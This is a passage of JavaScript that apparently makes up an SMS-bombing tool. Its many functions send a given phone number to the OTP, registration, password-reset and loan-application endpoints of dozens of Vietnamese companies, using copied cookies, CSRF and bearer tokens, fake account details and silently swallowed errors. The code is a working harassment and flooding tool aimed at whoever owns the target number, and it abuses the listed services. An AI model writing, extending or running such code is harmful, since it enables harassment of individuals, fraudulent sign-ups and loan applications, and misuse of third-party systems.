		await axios.post('https://viettel.vn/api/get-otp-contract-mobile', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_Viettel_V3(phone) {
	try {
		const cookies = {
			'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
			'__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
			'redirectLogin': 'https://viettel.vn/dang-ky',
			'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
		};
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json;charset=UTF-8',
			'Origin': 'https://viettel.vn',
			'Referer': 'https://viettel.vn/dang-ky',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
			'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
			'X-Requested-With': 'XMLHttpRequest',
			'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
		};
		const jsonData = { msisdn: phone };
		await axios.post('https://viettel.vn/api/get-otp', jsonData, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Watsons(phone) {
	try {
		const url = 'https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep';
		const params = { lang: 'vi' };
		const payload = {
			otpTokenRequest: {
				action: 'REGISTRATION',
				type: 'SMS',
				countryCode: '84',
				target: phone,
			},
			defaultAddress: {
				mobileNumberCountryCode: '84',
				mobileNumber: phone,
			},
			mobileNumber: phone,
		};
		const headers = {
			'User-Agent': 'WTCVN/24050.8.0 (iOS/17.0.2)',
			'Accept': 'application/json, text/plain, */*',
			'Content-Type': 'application/json',
			'x-session-token': '5b3f554c05258ea55ab506a1ffc7aa8d',
			'baggage': 'sentry-environment=preprod,sentry-public_key=8d22ab30a0174b6489b1e647ff6a8a28,sentry-release=vn.com.watsons.app%4024050.8.0%2B202407111813,sentry-trace_id=57b207211ecb40ad880861651a5e1914',
			'waiting-room-access-token': '',
			'x-app-name': 'Watsons%20VN',
			'accept-language': 'vi',
		};
		await axios.post(url, payload, { params, headers });
	} catch (e) {}
}

async function sendOTP_HoangPhuc(phone) {
	try {
		const cookies = {
			'form_key': 'fm7TzaicsnmIyKbm',
			'PHPSESSID': '450982644b33ef1223c1657bb0c43204',
			'private_content_version': 'e7d88709c6ccef5f8c32a41289ece818',
		};
		const headers = {
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://hoang-phuc.com',
			'referer': 'https://hoang-phuc.com/customer/account/create/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-requested-with': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({ action_type: '1', tel: phone });
		await axios.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_TokyoLife(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/json',
			'origin': 'https://tokyolife.vn',
			'referer': 'https://tokyolife.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'signature': 'c5b0d82fae6baaced6c7f383498dfeb5',
			'timestamp': '1722427632213',
		};
		const jsonData = {
			phone_number: phone,
			name: 'Nguyễn Quang Ngọc',
			password: 'pUL3.GFSd4MWYXp',
			email: 'reggg10tb@gmail.com',
			birthday: '2002-03-12',
			gender: 'male',
		};
		await axios.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_30Shine(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'authorization': '',
			'content-type': 'application/json',
			'origin': 'https://30shine.com',
			'referer': 'https://30shine.com/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { phone: phone };
		await axios.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_CathayLife(phone) {
	try {
		const cookies = {
			'JSESSIONID': 'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
			'TS01f67c5d': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
			'BIGipServerB2C_http': '!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==',
		};
		const headers = {
			'Accept': 'application/json, text/javascript, */*; q=0.01',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Origin': 'https://www.cathaylife.com.vn',
			'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-Requested-With': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			memberMap: `{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"${phone}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}`,
			OTP_TYPE: 'P',
			LANGS: 'vi_VN',
		});
		await axios.post('https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_BatDongSan(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const params = { phoneNumber: phone };
		await axios.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', { params, headers });
	} catch (e) {}
}

async function sendOTP_Gumac(phone) {
	try {
		const headers = {
			'Accept': 'application/json',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/json',
			'Origin': 'https://gumac.vn',
			'Referer': 'https://gumac.vn/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const jsonData = { phone: phone };
		await axios.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_MutosiRegister(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
			'Content-Type': 'application/json',
			'Origin': 'https://mutosi.com',
			'Referer': 'https://mutosi.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
		};
		const jsonData = {
			name: 'hà khải',
			phone: phone,
			password: 'Vjyy1234@',
			confirm_password: 'Vjyy1234@',
			firstname: null,
			lastname: null,
			verify_otp: 0,
			store_token: '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
			email: 'dd@gmail.com',
			birthday: '2006-02-13',
			accept_the_terms: 1,
			receive_promotion: 1,
		};
		await axios.post('https://api-omni.mutosi.com/client/auth/register', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_MutosiResetPassword(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/plain, */*',
			'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
			'Content-Type': 'application/json',
			'Origin': 'https://mutosi.com',
			'Referer': 'https://mutosi.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
		};
		const jsonData = {
			phone: phone,
			token: '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLRpHZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
			source: 'web_consumers',
		};
		await axios.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', jsonData, { headers });
	} catch (e) {}
}

async function sendOTP_VietAir(phone) {
	try {
		const refererUrl = `https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile=${phone}`;
		const cookies = {
			'_gcl_au': '1.1.515899722.1720625176',
			'_tt_enable_cookie': '1',
			'_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
			'_fbp': 'fb.2.1720625180842.882992170348492798',
			'__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
			'_gid': 'GA1.3.1511312052.1721112193',
			'_ga': 'GA1.1.186819165.1720625180',
		};
		const headers = {
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://vietair.com.vn',
			'referer': refererUrl,
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			op: 'PACKAGE_HTTP_POST',
			path_ajax_post: '/service03/sms/get',
			package_name: 'PK_FD_SMS_OTP',
			object_name: 'INS',
			P_MOBILE: phone,
			P_TYPE_ACTIVE_CODE: 'DANG_KY_NHAN_OTP',
		});
		await axios.post('https://vietair.com.vn/Handler/CoreHandler.ashx', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Fahasa(phone) {
	try {
		const cookies = {
			'frontend': '173c6828799e499e81cd64a949e2c73a',
			'frontend_cid': '7bCDwdDzwf8wpQKE',
		};
		const headers = {
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://www.fahasa.com',
			'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-requested-with': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({ phone: phone });
		await axios.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Shopiness(phone) {
	try {
		const headers = {
			'Accept': '*/*',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Connection': 'keep-alive',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Origin': 'https://shopiness.vn',
			'Referer': 'https://shopiness.vn/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-Requested-With': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({ action: 'verify-registration-info', phoneNumber: phone, refCode: '' });
		await axios.post('https://shopiness.vn/ajax/user', data, { headers });
	} catch (e) {}
}

async function sendOTP_Mocha35(phone) {
	try {
		const url = 'https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32';
		const payload = `clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username=${phone}&version=1.28`;
		const headers = {
			'User-Agent': 'mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)',
			'Content-Type': 'application/x-www-form-urlencoded',
			'uuid': 'B4DD9661-2B0B-418F-B953-6AE71C0373EC',
			'APPNAME': 'MC35',
			'mocha-api': '',
			'countryCode': 'VN',
			'languageCode': 'vi',
			'Accept-Language': 'vi-VN;q=1',
		};
		await axios.post(url, payload, { headers });
	} catch (e) {}
}

async function sendOTP_Bibabo(phone) {
	try {
		const url = 'https://one.bibabo.vn/api/v1/login/otp/createOtp';
		const params = { phone: phone, reCaptchaToken: 'undefined', appId: '7', version: '2' };
		const headers = {
			'User-Agent': 'bibabo/522 CFNetwork/1474 Darwin/23.0.0',
			'Accept': 'application/json, text/plain, */*',
			'accept-language': 'vi-VN,vi;q=0.9',
		};
		await axios.get(url, { params, headers });
	} catch (e) {}
}

async function sendOTP_Moca(phone) {
	try {
		const url = 'https://moca.vn/moca/v2/users/role';
		const params = { phoneNumber: phone };
		const headers = {
			'User-Agent': 'Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)',
			'digest': 'SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=',
			'device-token': '4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA',
			'x-requested-with': 'XMLHttpRequest',
			'device-id': 'b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1',
			'accept-language': 'vi',
			'x-moca-api-version': '2',
			'platform': 'P_IOS-2.10.156',
			'date': 'Thu, 01 Aug 2024 13:15:05 GMT',
			'x-request-id': '4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269',
		};
		await axios.get(url, { params, headers });
	} catch (e) {}
}

async function sendOTP_Pantio(phone) {
	try {
		const headers = {
			'accept': '*/*',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://pantio.vn',
			'referer': 'https://pantio.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const params = { domain: 'pantiofashion.myharavan.com' };
		const data = new URLSearchParams({ phoneNumber: phone });
		await axios.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', data, { params, headers });
	} catch (e) {}
}

async function sendOTP_Routine(phone) {
	try {
		const headers = {
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'origin': 'https://routine.vn',
			'referer': 'https://routine.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'x-requested-with': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({ telephone: phone, isForgotPassword: '0' });
		await axios.post('https://routine.vn/customer/otp/send/', data, { headers });
	} catch (e) {}
}

async function sendOTP_VayVND_Full(phone) {
	try {
		const headers = {
			'accept': 'application/json',
			'accept-language': 'vi-VN',
			'content-type': 'application/json; charset=utf-8',
			'origin': 'https://vayvnd.vn',
			'referer': 'https://vayvnd.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'site-id': '3',
		};
		const jsonData1 = {
			phone: phone,
			utm: [{ utm_source: 'leadbit', utm_medium: 'cpa' }],
			cpaId: 2,
			cpaLeadData: { click_id: '66A8D2827EED7B49190B756A', utm_campaign: '44559' },
			sourceSite: 3,
			regScreenResolution: { width: 1920, height: 1080 },
			trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
		};
		await axios.post('https://api.vayvnd.vn/v2/users', jsonData1, { headers });
		
		const jsonData2 = {
			login: phone,
			trackingId: 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
		};
		await axios.post('https://api.vayvnd.vn/v2/users/password-reset', jsonData2, { headers });
	} catch (e) {}
}

async function sendOTP_Tima(phone) {
	try {
		const cookies = {
			'ASP.NET_SessionId': 'm1ooydpmdnksdwkm4lkadk4p',
			'UrlSourceTima_V3': '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}',
			'tkld': 'b460087b-2c70-9d44-da8d-68d0d4c00f3a',
			'tbllender': 'tbllender',
		};
		const headers = {
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://tima.vn',
			'referer': 'https://tima.vn/vay-tien-online/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const randomName = generateRandomName();
		const data = new URLSearchParams({
			'application_full_name': randomName,
			'application_mobile_phone': phone,
			'CityId': '1',
			'DistrictId': '16',
			'rules': 'true',
			'TypeTime': '1',
			'application_amount': '0',
			'application_term': '0',
			'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'IsApply': '1',
			'ProvinceName': 'Thành phố Hà Nội',
			'DistrictName': 'Huyện Sóc Sơn',
			'product_id': '2',
		});
		await axios.post('https://tima.vn/Borrower/RegisterLoanCreditFast', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Paynet(phone) {
	try {
		const headers = {
			'Accept': 'application/json, text/javascript, */*; q=0.01',
			'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Origin': 'https://merchant.paynetone.vn',
			'Referer': 'https://merchant.paynetone.vn/User/Create',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'X-Requested-With': 'XMLHttpRequest',
		};
		const data = new URLSearchParams({
			'MobileNumber': phone,
			'IsForget': 'N',
		});
		await axios.post('https://merchant.paynetone.vn/User/GetOTP', data, { headers });
	} catch (e) {}
}

async function sendOTP_MoneyGo(phone) {
	try {
		const cookies = {
			'XSRF-TOKEN': 'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D',
			'laravel_session': 'eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
		};
		const headers = {
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://moneygo.vn',
			'referer': 'https://moneygo.vn/',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = new URLSearchParams({
			'_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
			'total': '56688000',
			'phone': phone,
			'agree': '1',
		});
		await axios.post('https://moneygo.vn/dang-ki-vay-nhanh', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_Pico(phone) {
	try {
		const headers1 = {
			'accept': '*/*',
			'accept-language': 'vi',
			'content-type': 'application/json',
			'origin': 'https://pico.vn',
			'referer': 'https://pico.vn/',
			'region-code': 'MB',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const randomName = generateRandomName();
		const jsonData1 = {
			name: randomName,
			phone: phone,
			provinceCode: '92',
			districtCode: '925',
			wardCode: '31261',
			address: '123',
		};
		await axios.post('https://auth.pico.vn/user/api/auth/register', jsonData1, { headers: headers1 });
		
		const headers2 = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'vi',
			'access': '206f5b6838b4e357e98bf68dbb8cdea5',
			'channel': 'b2c',
			'content-type': 'application/json',
			'origin': 'https://pico.vn',
			'party': 'ecom',
			'platform': 'Desktop',
			'region-code': 'MB',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
			'uuid': 'cc31d0b5815a483b92f547ab8438da53',
		};
		const jsonData2 = { phone: phone };
		await axios.post('https://auth.pico.vn/user/api/auth/login/request-otp', jsonData2, { headers: headers2 });
	} catch (e) {}
}

async function sendOTP_PNJ(phone) {
	try {
		const cookies = {
			'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
			'CDPI_RETURN': 'New',
			'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
			'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
			'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
		};
		const headers = {
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://www.pnj.com.vn',
			'referer': 'https://www.pnj.com.vn/customer/login',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = new URLSearchParams({
			'_method': 'POST',
			'_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
			'type': 'zns',
			'phone': phone,
		});
		await axios.post('https://www.pnj.com.vn/customer/otp/request', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_TiniWorld(phone) {
	try {
		const cookies = {
			'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
		};
		const headers = {
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
			'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://prod-tini-id.nkidworks.com',
			'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
		};
		const data = new URLSearchParams({
			'_csrf': '',
			'clientId': '609168b9f8d5275ea1e262d6',
			'redirectUrl': 'https://tiniworld.com',
			'phone': phone,
		});
		await axios.post('https://prod-tini-id.nkidworks.com/auth/tinizen', data, { headers, withCredentials: true });
	} catch (e) {}
}

async function sendOTP_TakomoV2(phone) {
	try {
		const cookies = {
			'__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
